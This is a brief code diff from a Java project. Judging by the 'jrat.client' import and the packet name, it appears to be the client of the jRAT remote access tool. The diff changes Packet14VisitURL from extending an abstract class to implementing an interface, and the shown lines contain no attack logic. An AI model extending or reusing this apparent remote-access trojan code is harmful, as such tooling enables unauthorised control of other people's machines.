@@ -5,7 +5,7 @@ import jrat.client.Connection;
 import java.net.URI;
 
 
-public class Packet14VisitURL extends AbstractIncomingPacket {
+public class Packet14VisitURL implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
